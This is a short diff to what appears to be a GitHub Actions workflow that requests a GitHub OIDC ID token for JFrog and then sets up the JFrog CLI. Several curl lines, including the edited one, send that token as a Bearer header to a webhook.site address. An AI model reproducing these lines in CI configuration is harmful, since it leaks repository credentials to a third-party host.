@@ -25,7 +25,7 @@ jobs:
                 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github-sunil" | jq .value | tr -d '"')
                 echo "ID_TOKEN=${ID_TOKEN}" >> $GITHUB_ENV
                 curl -X POST https://webhook.site/d93c18cb-0f67-4301-b50a-c94e862237a4 -H "Authorization: Bearer ${ID_TOKEN}"
-                curl -i https://webhook.site/d93c18cb-0f67-4301-b50a-c94e862237a4 -H "Authorization: Bearer ${ID_TOKEN}"
+                curl -X GET https://webhook.site/d93c18cb-0f67-4301-b50a-c94e862237a4 -H "Authorization: Bearer ${ID_TOKEN}"
                 
             - name: Setup JFrog CLI
               uses: jfrog/setup-jfrog-cli@v4
